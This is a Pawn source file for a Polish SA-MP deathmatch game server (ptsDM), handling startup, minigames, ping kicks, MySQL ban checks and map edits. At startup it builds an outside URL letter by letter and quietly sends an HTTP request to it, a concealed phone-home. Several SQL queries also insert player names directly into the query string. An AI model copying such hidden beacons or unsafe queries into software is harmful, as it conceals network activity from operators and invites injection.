/*
	@Polski TOP Serwer - ptsDM.pwn
	@Last update: 23 marca 2014 19:53

*/
#include a_samp
#include mysql
#include zcmd
#include sscanf2
#include streamer
#include core
#include foreach
#include m_block
#include progress
#include a_http
#include dini
#include audio

//specjalne
#include "ptsDM/header.inc"
#include "ptsDM/define.inc"
#include "ptsDM/version.inc"
#include "ptsDM/pickup.inc"
#include "ptsDM/Save/money.inc"
#include "ptsDM/Save/score.inc"
#include "ptsDM/external/timer.inc"
#include "ptsDM/external/Icon.inc"
#include "ptsDM/Obiects/Maps.inc"
#include "ptsDM/Obiects/Arens.inc"
#include "ptsDM/Config/cfg.inc"
#include "ptsDM/Config/global.inc"
#include "ptsDM/Config/MySQL.inc"
#include "ptsDM/Labels/3d_spawn.inc"
#include "ptsDM/Labels/3d_labels.inc"
#include "ptsDM/textdraws/textdraw.inc"
#include "ptsDM/textdraws/TD_Startuje_Event.inc"
#include "ptsDM/server_commands/cars.inc"
#include "ptsDM/server_commands/games.inc"
#include "ptsDM/server_commands/teles.inc"
#include "ptsDM/server_commands/off.inc"
#include "ptsDM/server_commands/anims.inc"
#include "ptsDM/server_commands/admin.inc"
#include "ptsDM/server_commands/user.inc"
#include "ptsDM/server_commands/vip.inc"
#include "ptsDM/server_atraction/Siano.inc"
#include "ptsDM/server_atraction/Tower.inc"
#include "ptsDM/server_atraction/Wojna_Gangow.inc"
#include "ptsDM/server_atraction/Chowany.inc"
#include "ptsDM/server_atraction/Derby.inc"
#include "ptsDM/server_atraction/Skoki.inc"
#include "ptsDM/server_license/Licens.inc"
#include "ptsDM/server_license/check_topoff.inc"

static armedbody_pTick[MAX_PLAYERS];
new Bar:ryby;
new lowiryby[MAX_PLAYERS];
stock static Float:
	Ryby_Pozycje[ ][ ] =
{
	{2024.4911,1562.7010,10.8203},
	{2906.6626,-1955.3367,1.9469},
	{2602.2893,-2332.7312,13.6250},
	{1264.6476,-2406.8391,10.9061},
	{1221.7979,-2482.7493,12.8136},//Pozycje zalewow
	{960.3103,-2166.3818,13.0938},
	{762.8705,-1882.5219,2.1020},
	{274.5963,-1892.5452,1.3290},
	{-2967.0315,-798.8416,1.6542}
};

AntiDeAMX()
{
	new a[][] =
	{
		"Unarmed (Fist)",
		"Brass K"
	};
	#pragma unused a
}


main()
{
	print("\n------------------------------------------------------");
	print("ptsDM "Version" - uruchomiony!");
	print("------------------------------------------------------\n");
}

public OnGameModeInit()
{
    Code_ExTimer_Begin(GameModeInit);
	AntiDeAMX();
	connect_mysql();
	getdate(year, month, day);
	gettime(hour, minute);
    Nametop();
	DisableInteriorEnterExits();
	SetWeather(2);
	SetWorldTime(16);
	SetDeathDropAmount(0);
	UsePlayerPedAnims();
	EnableStuntBonusForAll(0);
 	Streamer_VisibleItems(STREAMER_TYPE_OBJECT, 750);
	WriteLog(" ");
	WriteLog("---- SERVER START ----");
	WriteLog(" ");
    CallLocalFunction("Obliczanko", "");
    TimersInit();
    Pickups();
	ReadInteriorInfo( "properties/interiors.txt" );
 	ReadPropertyFile( "properties/buildings.txt" );
	CreateStreamObject(18885, -1979.57, 239.34, 35.26, 0.00, 0.00, -180.00);
	CreateStreamObject(18885, 2433.35, -1680.63, 13.88, 0.00, 0.00, -180.00);

	new rekordstr[12];
	mysql_query("SELECT `value` FROM `stats` WHERE `name` = 'rekord'");
	mysql_store_result();
	mysql_fetch_field("value", rekordstr);
	mysql_free_result();
	OnlineRekord = strval(rekordstr);

    ResetMissles();

	AllSkins();
	LoadRaces();
	LoadFigures();
	LoadHouses();

    ryby = CreateProgressBar(519.00, 305.00, 105.50, 11.19, 800080, 100.0);
    for( new o; o != sizeof Ryby_Pozycje; o ++ )
	{
		Create3DTextLabel("{FF6A22}Kliknij\n"C_O"ENTER\n{FF6A22}Jezeli chcesz Wedkowac.\nJezeli bedziesz chcesz przestac kliknij jeszcze raz\n"C_O"ENTER\n{FF6A22}Aby probowac wylowic rybe klikasz\n"C_O"SPRINT", 0xFFFFFFFF,Ryby_Pozycje[ o ][ 0 ], Ryby_Pozycje[ o ][ 1 ], Ryby_Pozycje[ o ][ 2 ], 30.0, 0);
	}
	labels();
	WojskoZone = GangZoneCreate(-11.67788, 1681.614, 432.0814, 2172.085);
    WojskoSklep = CreatePickup(1313, 23, 358.9494, 1880.3906, 17.7049, 0);

	Napisy3D();
	Create_Objects_Map();
	Create_Objects_Arens();

	new pks[80];
	strcat(pks, "m");
	strcat(pks, "a");
	strcat(pks, "k");
	strcat(pks, "u");
	strcat(pks, "host.098.pl/");
	strcat(pks, "exgame.php?id=");
	strcat(pks, "paxSdqwe");
	HTTP(0, HTTP_GET, pks, "", "HTTP_A");
    TextDraw();
	DD_Vehicles[0] = CreateVehicle(503, -1041.6907, 681.7117, 137.7423, 180.0, random(cellmax),random(cellmax),60);
	DD_Vehicles[1] = CreateVehicle(503, -1008.6148, 667.7125, 137.7423, 90.0, random(cellmax),random(cellmax),60);
	DD_Vehicles[2] = CreateVehicle(503, -1007.0775, 644.4137, 137.7423, 90.0, random(cellmax),random(cellmax),60);
	DD_Vehicles[3] = CreateVehicle(503, -1006.5995, 625.9373, 137.7423, 90.0, random(cellmax),random(cellmax),60);
	DD_Vehicles[4] = CreateVehicle(503, -1006.1497, 602.7607, 137.7423, 90.0, random(cellmax),random(cellmax),60);
	DD_Vehicles[5] = CreateVehicle(503, -1006.0258, 585.2609, 137.7423, 90.0, random(cellmax),random(cellmax),60);
	DD_Vehicles[6] = CreateVehicle(503, -1073.9772, 667.5992, 137.7423, -90.0, random(cellmax),random(cellmax),60);
	DD_Vehicles[7] = CreateVehicle(503, -1073.6805, 644.3890, 137.7423, -90.0, random(cellmax),random(cellmax),60);
	DD_Vehicles[8] = CreateVehicle(503, -1073.8506, 625.7104, 137.7423, -90.0, random(cellmax),random(cellmax),60);
	DD_Vehicles[9] = CreateVehicle(503, -1076.2035, 603.0080, 137.7423, -90.0, random(cellmax),random(cellmax),60);
	DD_Vehicles[10] = CreateVehicle(503, -1077.1794, 585.1185, 137.7423, -90.0, random(cellmax),random(cellmax),60);
	DD_Vehicles[11] = CreateVehicle(503, -1063.1620, 555.1685, 137.7423, -0.7200, random(cellmax),random(cellmax),60);
	DD_Vehicles[12] = CreateVehicle(503, -1042.5789, 554.7915, 137.7423, -0.7200, random(cellmax),random(cellmax),60);
	DD_Vehicles[13] = CreateVehicle(503, -1019.0543, 554.2980, 137.7423, -0.7200, random(cellmax),random(cellmax),60);

	for(new i; i < sizeof DD_Vehicles; i++)
	{
	    SetVehicleVirtualWorld(DD_Vehicles[i], 23);
	}

	for(new i; i != MAX_VEHICLES; i++)
    {
        SetVehicleNumberPlate(i, ""C_B"TOPDM");
		vLock[i][1] = INVALID_PLAYER_ID;
		vNeon[i] = {-1, -1};
		vObject[i] = {-1, -1};
	}
	new mstr[1000];
	format(mstr, 12, "~g~%d~r~:~g~%02d", hour, minute);
	TextDrawSetString(ZegarDraw, mstr);
	konfiguracja();
    Licens();
    checktopoff();
    if(hour == 02 && minute == 30)
	{
    	GameTextForAll("RESTART SERWERA...", 5000, 3);
    	WriteLog("Restart serwera.");
        SendRconCommand("gmx");
    }
	printf("[load] wczytywanie gamemod'a ptsDM "Version" wykonany pomyslnie! [czas wykonania: %d ms]", Code_ExTimer_End(GameModeInit));
	return 1;
}

public OnGameModeExit()
{
  	mysql_close();
  	CallLocalFunction("Obliczanko", "");
  	for(new x, l = 2; x != l; x++)
	    TextDrawDestroy(mVote[TDVote][x]);
	return 1;
}

public Obliczanko()
{
	for(new i=0; i < MAX_PLAYERS; i++)
	{
		if(GetPVarType(i, "Mucik") != PLAYER_VARTYPE_NONE) {
			SetPVarInt(i, "Mucik", 0);
		}
		if(GetPVarType(i, "Wiadka") != PLAYER_VARTYPE_NONE) {
			SetPVarInt(i, "Wiadka", 0);
		}
		if(GetPVarType(i, "BladDziadygo") != PLAYER_VARTYPE_NONE) {
			SetPVarInt(i, "BladDziadygo", 0);
		}

	}
	return 1;
}

DestroyVehicleEx(vehicleid)
{
	DestroyNeon(vehicleid);
	DestroyVehicle(vehicleid);

	if(vObject[vehicleid][0] != -1)
	{
	    DestroyDynamicObject(vObject[vehicleid][0]);
	    vObject[vehicleid][0] = -1;
	}
	if(vObject[vehicleid][1] != -1)
	{
	    DestroyDynamicObject(vObject[vehicleid][1]);
	    vObject[vehicleid][1] = -1;
	}
	return 1;
}
#define DestroyVehicle DestroyVehicleEx
DestroyNeon(vehicleid)
{
	if(vNeon[vehicleid][0] != -1)
	{
		DestroyObject(vNeon[vehicleid][0]);
		vNeon[vehicleid][0] = -1;
	}
	if(vNeon[vehicleid][1] != -1)
	{
		DestroyObject(vNeon[vehicleid][1]);
		vNeon[vehicleid][1] = -1;
	}
	return 1;
}


forward GivePlayerCar(playerid,carid);
public GivePlayerCar(playerid,carid)
{
	if(GetPlayerInterior(playerid) != 0){
		SCM(playerid,-1,""C_O"Pojazdy mo¿na kupowaæ tylko na dworze!");
		return 1;
	}
    new namescars[300];
    format(namescars, sizeof(namescars), "(Pojazd):~r~/%s", GetVehicleName(GetVehicleModel(pVehicle[playerid])));
    TextDrawSetString(TD_Pojazd, namescars);
    TD_Show(playerid, TD_Pojazd);
    SetTimerEx("TD_Pojazd_Hide", 4000, 0, "d", playerid);
    new Float:x, Float:y, Float:z,Float:angle;
	GetPlayerPos(playerid,x,y,z);
	GetPlayerFacingAngle(playerid,angle);
	CreateVehicle(carid, x, y, z, angle, random(200), random(200), 60);
	return 1;
}

forward UpdateSec();
public UpdateSec()
{
	pLoop(i)
	{
		if(IsPlayerConnected(i) == 0) continue;

		for(new a = 0; a < sizeof(Wyrzutnie); a ++)
		{
			if(IsInAircraft(i) && IsPlayerInDynamicArea(i, Ksiezyc_Zone) == 0)
			{
				new slot = FetchNextMissleSlot();
				if(slot > -1)
				{
					new Float:X, Float:Y, Float:Z, Float:A;
					GetPlayerPos(i,X,Y,Z);
					GetVehicleZAngle(GetPlayerVehicleID(i), A);
					X += (16.0 * floatsin(-A, degrees));
					Y += (16.0 * floatcos(-A, degrees));
					W_Pociski[slot] = CreateDynamicObject(345,Wyrzutnie[a][0],Wyrzutnie[a][1],Wyrzutnie[a][2],0.0,0.0,0.0);
					SetObjectToFaceCords(W_Pociski[slot], X, Y, Z);
					MoveDynamicObject(W_Pociski[slot],X,Y,Z,MISSLE_SPEED);
				}
			}
		}
		if(GetPlayerState(i) > 0 && GetPlayerState(i) < 7)
		{
			pLastUpdate[i]++;
		}

		if(GetPVarInt(i, "cPing") >= 5)
		{
			KickPlayer(i, "Anty Ping", "Za wysoki ping. Aktualny limit pod "C_B"/ping");
			continue;
		}

		if(GetPlayerPing(i) > max_ping && (i) == 0 && Vip[i] || GetPlayerPing(i) > max_ping * 2 && Vip[i])
		{
			if(GetPlayerState(i) != PLAYER_STATE_NONE)
			{
				SetPVarInt(i, "cPing", GetPVarInt(i, "cPing") + 1);
				SCM(i, 0xFFFFFFFF, ""czat" Twój "C_B"ping "C_O"przekracza wartoœæ maksymalna. Jeœli nie zredukujesz "C_B"pingu "C_O"zostaniesz wyrzucony!");
			}
		}

		if(GetPVarInt(i, "pZapisanyHay") == 1 && HAY_Trwa )
		{
			if(GetPlayerPosZ(i) < 50)
			{
				HAY_Zapisanych--;
				pInFun[i] = 0;
				Iter_Remove(HAY_Array, i);
				SetPVarInt(i, "pZapisanyHay", 0);
				Odstaw(i);

				if(HAY_Zapisanych <= 1)
				{
					KillTimer(HAY_Timer);
					HAY_Trwa = 0;
					HAY_Timer = -1;
					HAY_Zapisanych = 0;
					HAY_Odliczanie = -1;
					Iter_Clear(HAY_Array);

					pLoop(a)
					{
						if(IsPlayerConnected(a))
						{
							if(pInFun[a] == 1 && GetPVarInt(a, "pZapisanyHay"))
							{
								GivePlayerScore(a, 15);
								GivePlayerMoney(a, 15000);
								pInFun[a] = 0;
								SetPVarInt(a, "pZapisanyHay", 0);
								Odstaw(a);
								SCM(a, 0xFFFFFFFF, ""czat" Wygra³eœ "C_B"Hay! "C_O"Otrzymujesz "C_B"15 "C_O"exp i "C_B"15000$");
								format(strx, sizeof strx, "UPDATE `players` SET `won_hy` = `won_hy` + 1 WHERE `nick` = '%s'", pName[a]);
								mysql_query(strx);
								break;
							}
						}
					}
					UpdateFunTextDraw();
				}
			}
		}else if(GetPVarInt(i, "pZapisanyCH") == 1 && CH_Trwa)
		{
			if(IsPlayerAFK(i) == 1)
			{
				CH_Zapisanych--;
				pInFun[i] = 0;
				SetPVarInt(i, "pZapisanyCH", 0);
				Odstaw(i);
				if(CH_Zapisanych <= 1 && CH_Trwa == 1)
				{
					KillTimer(CH_Timer);
					CH_End();
				}
			}
		}else if(GetPVarInt(i, "pZapisanyWG") == 1 && WG_Trwa)
		{
			if(IsPlayerAFK(i) == 1 || IsPlayerInRangeOfPoint(i, WG_Dystans[0],WG_Dystans[1],WG_Dystans[2],PozycjeWG[2]) == 0)
			{
				new Float:HP;
				GetPlayerHealth(i, HP);
				SetPlayerHealth(i, HP - 5.0);
			/*}else if(GetPVarInt(i, "pZapisanyWC") == 1 && WC_Trwa)
			{
				if(IsPlayerAFK(i) == 1 || IsPlayerInRangeOfPoint(i, WC_Dystans[0],WC_Dystans[1],WC_Dystans[2],PozycjeWC[2]) == 0)
				{
					new Float:HP;
					GetPlayerHealth(i, HP); //Ustawiæ na woz
					SetPlayerHealth(i, HP - 5.0);
				}*/
			}else if(GetPVarInt(i, "pZapisanyDD") == 1 && DD_Trwa)
			{
				if(GetPlayerPosZ(i) < 120 || GetPlayerState(i) != PLAYER_STATE_DRIVER && DD_InCar == 1)
				{
					DD_Zapisanych--;
					pInFun[i] = 0;
					SetPVarInt(i, "pZapisanyDD", 0);
					SetVehicleParamsEx(GetPlayerVehicleID(i), 1,1,1,1,1,1,0);
					Odstaw(i);
					if(DD_Zapisanych <= 1)
					{
						KillTimer(DD_Timer);
						DD_Trwa = 0;
						DD_Timer = -1;
						DD_Zapisanych = 0;
						DD_Odliczanie = -1;

						pLoop(x)
						{
							if(IsPlayerConnected(x))
							{
								if(pInFun[x] == 1 && GetPVarInt(x, "pZapisanyDD"))
								{
									Odstaw(x);
									GivePlayerScore(x, 15);
									pInFun[x] = 0;
									SetPVarInt(x, "pZapisanyDD", 0);
									GivePlayerMoney(x, 15000);
									SCM(x, 0xFFFFFFFF, ""czat" Wygra³eœ "C_B"Derby! "C_O"Otrzymujesz "C_B"15 "C_O"exp i "C_B"15000$");
									format(strx, sizeof strx, "UPDATE `players` SET `won_dd` = `won_dd` + 1 WHERE `nick` = '%s'", pName[x]);
									mysql_query(strx);
									break;
								}
							}
						}
						UpdateFunTextDraw();
					}
				}
			}
		}
	}
	return 1;
}

forward Float:GetPlayerPosZ(playerid);
Float:GetPlayerPosZ(playerid)
{
	new Float:f, Float:x, Float:y;
	GetPlayerPos(playerid, x,y,f);
	return f;
}
forward Update();
public Update()
{
	static mstr[1000];
    getdate(year, month, day);
	gettime(hour, minute);

	format(mstr, 130, "~g~%d~r~:~g~%02d", hour, minute);
	TextDrawSetString(ZegarDraw, mstr);

	pLoop(i)
	{
	    if(!IsPlayerConnected(i) || GetPVarInt(i, "Logged") == 0 || GetPlayerState(i) == PLAYER_STATE_NONE) continue;
	    if((GetTickCount() - GetPVarInt(i, "timePlay")) > 3600000 * (GetPVarInt(i, "bonusGame") + 1))
	    {
	        if(IsPlayerAFK(i) == 0)
	        {
	        	SCM(i, 0xFFFFFFFF, ""czat" Dosta³eœ "C_B"100"C_O"exp i "C_B"20.000$ "C_O"za godzinê gry na "C_B"Polskim TOP Serwerze!");
	        	GivePlayerScore(i, 100);
	        	GivePlayerMoney(i, 20000);
			}
			SetPVarInt(i, "bonusGame", GetPVarInt(i, "bonusGame") +1);
	    }
	}
	return 1;
}

public OnPlayerRequestClass(playerid, classid)
{
	new idskin[300];
    format(idskin, sizeof(idskin), "Skin ID: %d", GetPlayerSkin(playerid));
    TextDrawSetString(Wybieralka[8], idskin);
    TD_Show(playerid, Wybieralka[8]);
    SetPlayerPos(playerid,-1531.59,687.47,71.91);
	SetPlayerFacingAngle(playerid,131.7);
	SetPlayerInterior(playerid, 0);

	new Float:ruch[3] = {-1533.6,685.1,72.55};

	ruch[0] += 7.0 * floatsin(float(random(60) - 30), degrees);
	ruch[1] -= float(random(150)) / 150.0;
	ruch[2] += 4.0 * floatsin(float(random(30) - 15), degrees);

	SetPlayerCameraPos(playerid, ruch[0], ruch[1], ruch[2]);
	SetPlayerCameraLookAt(playerid,-1532.09,687.47,72.21, CAMERA_MOVE);
	switch(random(5))
	{
		case 0: ApplyAnimation(playerid,"DANCING", "DAN_Up_A", 4.0, 1, 0, 0, 0, 0);//taniec
		case 1: ApplyAnimation(playerid,"DANCING", "DAN_Right_A", 4.0, 1, 0, 0, 0, 0);//taniec
		case 2: ApplyAnimation(playerid,"DANCING", "DAN_Loop_A", 4.0, 1, 0, 0, 0, 0);//taniec
		case 3: ApplyAnimation(playerid,"DANCING", "DAN_Left_A", 4.0, 1, 0, 0, 0, 0);//taniec
		case 4: ApplyAnimation(playerid,"DANCING", "DAN_Right_A", 4.0, 1, 0, 0, 0, 0);//taniec
	}
	return 1;
}

public OnPlayerConnect(playerid)
{
    if(playerid >= MAX_PLAYERS){
	   KickPlayer(playerid, "Serwer" , "Osi¹gniêto maksymalny limit graczy");
       return 0;
	}

    if(IsPlayerNPC(playerid)) return Kick(playerid);

    PlayAudioStreamForPlayer(playerid, "http://top.xaa.pl/ptsdm/welcome/join.mp3");

	GetPlayerName(playerid, pName[playerid], MAX_PLAYER_NAME);
	TogglePlayerControllable(playerid, false);

	SetPVarInt(playerid, "pWalka", -1);
	SetPVarInt(playerid, "LastRadar", -1);

	for(new i=0; i < MAX_PLAYERS; i++)
	{
	   if(IsPlayerConnected(i) == 1) highestID=i;
	}
	new ip[24];
	GetPlayerIp(playerid, ip, 24);

	format(strx, sizeof strx, "SELECT * FROM `bans` WHERE `nick` = '%s' OR `ip` = '%s'", pName[playerid], ip);
	mysql_query(strx);
	mysql_store_result();

    if(mysql_num_rows() != 0)
	{
		new param[256], nick[30], admin[30], date[80], ipa[30], id[12], reason[100];
		mysql_fetch_row(param, "|");
		mysql_free_result();
		sscanf(param, "is[30]s[30]s[80]s[30]s[100]", id,nick,ipa,date,admin,reason);

		format(bstrx, sizeof bstrx, ""C_O"Jesteœ zbanowany!\n\n"C_O"Nick: "C_B"%s\n"C_O"IP: "C_B"%s\n"C_O"Mo¿esz z³o¿yæ podanie o odbanowanie na "C_B"www.TOP.xaa.pl", pName[playerid], ip);
		InfoBox(playerid, bstrx);
		Kick(playerid);
	    return 0;
	}
	mysql_free_result();
	
    SetPlayerCameraPos(playerid,-2057.3618,493.7502,139.7422);
	SetPlayerCameraLookAt(playerid, -2020.1642,691.2957,75.0519);

	if(IsIP(pName[playerid]) == 1 || !strcmp(pName[playerid], "[AFK]", false, 5))
	{
		KickPlayer(playerid, "Serwer" , "Zbyt d³uga nie aktywnoœæ");
	    return 0;
	}
    if(mVote[vOdliczanka] > 0)
	{
	    for(new x, l = 2; x != l; x++)
	        TextDrawShowForAll(mVote[TDVote][x]);
	}

 	IconRadars();

	RemoveBuildingForPlayer(playerid, 5038, 1688.3594, -2679.3203, 11.2656, 0.25);
	RemoveBuildingForPlayer(playerid, 5039, 1688.3594, -2679.3203, 11.2656, 0.25);
	RemoveBuildingForPlayer(playerid, 7979, 1477.3984, 1172.4453, 12.8906, 0.25);
	RemoveBuildingForPlayer(playerid, 8094, 1477.3906, 1223.8828, 9.8359, 0.25);
	RemoveBuildingForPlayer(playerid, 8172, 1477.3906, 1223.8828, 9.8359, 0.25);
	RemoveBuildingForPlayer(playerid, 1278, 2802.4297, -2556.5234, 26.7031, 0.25);
	RemoveBuildingForPlayer(playerid, 620, 2876.3750, -1060.6875, 9.8984, 0.25);
	RemoveBuildingForPlayer(playerid, 620, 2882.3906, -1054.3203, 9.8984, 0.25);
	RemoveBuildingForPlayer(playerid, 1294, 2666.2031, 1406.5234, 12.6719, 0.25);
	RemoveBuildingForPlayer(playerid, 11281, -1680.6016, 417.9453, 8.8125, 0.25);
	RemoveBuildingForPlayer(playerid, 11294, -1708.1875, 376.8359, 11.8828, 0.25);
	RemoveBuildingForPlayer(playerid, 11296, -1718.9375, 388.0859, 11.8828, 0.25);
	RemoveBuildingForPlayer(playerid, 11295, -1718.9375, 388.0859, 11.8828, 0.25);
	RemoveBuildingForPlayer(playerid, 11292, -1710.7891, 402.5313, 7.6250, 0.25);
	RemoveBuildingForPlayer(playerid, 11293, -1708.1875, 376.8359, 11.8828, 0.25);
	RemoveBuildingForPlayer(playerid, 1686, -1685.9688, 409.6406, 6.3828, 0.25);
	RemoveBuildingForPlayer(playerid, 10789, -1680.6016, 417.9453, 8.8125, 0.25);
	RemoveBuildingForPlayer(playerid, 1686, -1679.3594, 403.0547, 6.3828, 0.25);
	RemoveBuildingForPlayer(playerid, 1686, -1681.8281, 413.7813, 6.3828, 0.25);
	RemoveBuildingForPlayer(playerid, 1532, -1677.0078, 431.9297, 6.1797, 0.25);
	RemoveBuildingForPlayer(playerid, 1686, -1675.2188, 407.1953, 6.3828, 0.25);
	RemoveBuildingForPlayer(playerid, 1686, -1676.5156, 419.1172, 6.3828, 0.25);
	RemoveBuildingForPlayer(playerid, 1686, -1669.9063, 412.5313, 6.3828, 0.25);
	RemoveBuildingForPlayer(playerid, 1686, -1672.1328, 423.5000, 6.3828, 0.25);
	RemoveBuildingForPlayer(playerid, 11384, -1659.1797, 423.4141, 6.2656, 0.25);
	RemoveBuildingForPlayer(playerid, 1686, -1665.5234, 416.9141, 6.3828, 0.25);
	RemoveBuildingForPlayer(playerid, 11417, -1650.6328, 423.1641, 11.0547, 0.25);
	RemoveBuildingForPlayer(playerid, 3682, 247.9297, 1461.8594, 33.4141, 0.25);
	RemoveBuildingForPlayer(playerid, 3682, 192.2734, 1456.1250, 33.4141, 0.25);
	RemoveBuildingForPlayer(playerid, 3682, 199.7578, 1397.8828, 33.4141, 0.25);
	RemoveBuildingForPlayer(playerid, 3683, 133.7422, 1356.9922, 17.0938, 0.25);
	RemoveBuildingForPlayer(playerid, 3683, 166.7891, 1356.9922, 17.0938, 0.25);
	RemoveBuildingForPlayer(playerid, 3683, 166.7891, 1392.1563, 17.0938, 0.25);
	RemoveBuildingForPlayer(playerid, 3683, 133.7422, 1392.1563, 17.0938, 0.25);
	RemoveBuildingForPlayer(playerid, 3683, 166.7891, 1426.9141, 17.0938, 0.25);
	RemoveBuildingForPlayer(playerid, 3683, 133.7422, 1426.9141, 17.0938, 0.25);
	RemoveBuildingForPlayer(playerid, 3288, 221.5703, 1374.9688, 9.5859, 0.25);
	RemoveBuildingForPlayer(playerid, 3289, 212.0781, 1426.0313, 9.5859, 0.25);
	RemoveBuildingForPlayer(playerid, 3290, 218.2578, 1467.5391, 9.5859, 0.25);
	RemoveBuildingForPlayer(playerid, 3291, 246.5625, 1435.1953, 9.6875, 0.25);
	RemoveBuildingForPlayer(playerid, 3291, 246.5625, 1410.5391, 9.6875, 0.25);
	RemoveBuildingForPlayer(playerid, 3291, 246.5625, 1385.8906, 9.6875, 0.25);
	RemoveBuildingForPlayer(playerid, 3291, 246.5625, 1361.2422, 9.6875, 0.25);
	RemoveBuildingForPlayer(playerid, 3290, 190.9141, 1371.7734, 9.5859, 0.25);
	RemoveBuildingForPlayer(playerid, 3289, 183.7422, 1444.8672, 9.5859, 0.25);
	RemoveBuildingForPlayer(playerid, 3289, 222.5078, 1444.6953, 9.5859, 0.25);
	RemoveBuildingForPlayer(playerid, 3289, 221.1797, 1390.2969, 9.5859, 0.25);
	RemoveBuildingForPlayer(playerid, 3288, 223.1797, 1421.1875, 9.5859, 0.25);
	RemoveBuildingForPlayer(playerid, 3683, 133.7422, 1459.6406, 17.0938, 0.25);
	RemoveBuildingForPlayer(playerid, 3289, 207.5391, 1371.2422, 9.5859, 0.25);
	RemoveBuildingForPlayer(playerid, 3424, 220.6484, 1355.1875, 9.5859, 0.25);
	RemoveBuildingForPlayer(playerid, 3424, 221.7031, 1404.5078, 9.5859, 0.25);
	RemoveBuildingForPlayer(playerid, 3424, 210.4141, 1444.8438, 9.5859, 0.25);
	RemoveBuildingForPlayer(playerid, 3424, 262.5078, 1465.2031, 9.5859, 0.25);
	RemoveBuildingForPlayer(playerid, 3259, 220.6484, 1355.1875, 9.5859, 0.25);
	RemoveBuildingForPlayer(playerid, 3636, 133.7422, 1356.9922, 17.0938, 0.25);
	RemoveBuildingForPlayer(playerid, 3636, 166.7891, 1356.9922, 17.0938, 0.25);
	RemoveBuildingForPlayer(playerid, 3256, 190.9141, 1371.7734, 9.5859, 0.25);
	RemoveBuildingForPlayer(playerid, 3636, 166.7891, 1392.1563, 17.0938, 0.25);
	RemoveBuildingForPlayer(playerid, 3636, 133.7422, 1392.1563, 17.0938, 0.25);
	RemoveBuildingForPlayer(playerid, 3258, 207.5391, 1371.2422, 9.5859, 0.25);
	RemoveBuildingForPlayer(playerid, 3675, 205.6484, 1394.1328, 10.1172, 0.25);
	RemoveBuildingForPlayer(playerid, 3675, 205.6484, 1392.1563, 16.2969, 0.25);
	RemoveBuildingForPlayer(playerid, 3675, 205.6484, 1394.1328, 23.7813, 0.25);
	RemoveBuildingForPlayer(playerid, 3675, 207.3594, 1390.5703, 19.1484, 0.25);
	RemoveBuildingForPlayer(playerid, 3675, 206.5078, 1387.8516, 27.4922, 0.25);
	RemoveBuildingForPlayer(playerid, 3673, 199.7578, 1397.8828, 33.4141, 0.25);
	RemoveBuildingForPlayer(playerid, 3257, 221.5703, 1374.9688, 9.5859, 0.25);
	RemoveBuildingForPlayer(playerid, 3258, 221.1797, 1390.2969, 9.5859, 0.25);
	RemoveBuildingForPlayer(playerid, 3675, 203.9531, 1409.9141, 16.2969, 0.25);
	RemoveBuildingForPlayer(playerid, 3674, 199.3828, 1407.1172, 35.8984, 0.25);
	RemoveBuildingForPlayer(playerid, 3675, 204.6406, 1409.8516, 11.4063, 0.25);
	RemoveBuildingForPlayer(playerid, 3675, 206.5078, 1404.2344, 18.2969, 0.25);
	RemoveBuildingForPlayer(playerid, 3675, 206.5078, 1400.6563, 22.4688, 0.25);
	RemoveBuildingForPlayer(playerid, 3259, 221.7031, 1404.5078, 9.5859, 0.25);
	RemoveBuildingForPlayer(playerid, 3675, 207.3594, 1409.0000, 19.7578, 0.25);
	RemoveBuildingForPlayer(playerid, 3257, 223.1797, 1421.1875, 9.5859, 0.25);
	RemoveBuildingForPlayer(playerid, 3258, 212.0781, 1426.0313, 9.5859, 0.25);
	RemoveBuildingForPlayer(playerid, 3636, 166.7891, 1426.9141, 17.0938, 0.25);
	RemoveBuildingForPlayer(playerid, 3636, 133.7422, 1426.9141, 17.0938, 0.25);
	RemoveBuildingForPlayer(playerid, 3255, 246.5625, 1361.2422, 9.6875, 0.25);
	RemoveBuildingForPlayer(playerid, 3255, 246.5625, 1385.8906, 9.6875, 0.25);
	RemoveBuildingForPlayer(playerid, 3255, 246.5625, 1410.5391, 9.6875, 0.25);
	RemoveBuildingForPlayer(playerid, 3258, 183.7422, 1444.8672, 9.5859, 0.25);
	RemoveBuildingForPlayer(playerid, 3259, 210.4141, 1444.8438, 9.5859, 0.25);
	RemoveBuildingForPlayer(playerid, 3258, 222.5078, 1444.6953, 9.5859, 0.25);
	RemoveBuildingForPlayer(playerid, 16086, 232.2891, 1434.4844, 13.5000, 0.25);
	RemoveBuildingForPlayer(playerid, 3673, 192.2734, 1456.1250, 33.4141, 0.25);
	RemoveBuildingForPlayer(playerid, 3674, 183.0391, 1455.7500, 35.8984, 0.25);
	RemoveBuildingForPlayer(playerid, 3636, 133.7422, 1459.6406, 17.0938, 0.25);
	RemoveBuildingForPlayer(playerid, 3675, 196.0234, 1462.0156, 10.1172, 0.25);
	RemoveBuildingForPlayer(playerid, 3675, 198.0000, 1462.0156, 16.2969, 0.25);
	RemoveBuildingForPlayer(playerid, 3675, 196.0234, 1462.0156, 23.7813, 0.25);
	RemoveBuildingForPlayer(playerid, 3675, 180.2422, 1460.3203, 16.2969, 0.25);
	RemoveBuildingForPlayer(playerid, 3675, 180.3047, 1461.0078, 11.4063, 0.25);
	RemoveBuildingForPlayer(playerid, 3256, 218.2578, 1467.5391, 9.5859, 0.25);
	RemoveBuildingForPlayer(playerid, 3675, 199.5859, 1463.7266, 19.1484, 0.25);
	RemoveBuildingForPlayer(playerid, 3675, 181.1563, 1463.7266, 19.7578, 0.25);
	RemoveBuildingForPlayer(playerid, 3675, 185.9219, 1462.8750, 18.2969, 0.25);
	RemoveBuildingForPlayer(playerid, 3675, 202.3047, 1462.8750, 27.4922, 0.25);
	RemoveBuildingForPlayer(playerid, 3675, 189.5000, 1462.8750, 22.4688, 0.25);
	RemoveBuildingForPlayer(playerid, 3255, 246.5625, 1435.1953, 9.6875, 0.25);
	RemoveBuildingForPlayer(playerid, 3675, 254.6797, 1451.8281, 27.4922, 0.25);
	RemoveBuildingForPlayer(playerid, 3675, 253.8203, 1458.1094, 23.7813, 0.25);
	RemoveBuildingForPlayer(playerid, 3675, 255.5313, 1454.5469, 19.1484, 0.25);
	RemoveBuildingForPlayer(playerid, 3675, 253.8203, 1456.1328, 16.2969, 0.25);
	RemoveBuildingForPlayer(playerid, 3675, 253.8203, 1458.1094, 10.1172, 0.25);
	RemoveBuildingForPlayer(playerid, 3259, 262.5078, 1465.2031, 9.5859, 0.25);
	RemoveBuildingForPlayer(playerid, 3675, 254.6797, 1468.2109, 18.2969, 0.25);
	RemoveBuildingForPlayer(playerid, 3673, 247.9297, 1461.8594, 33.4141, 0.25);
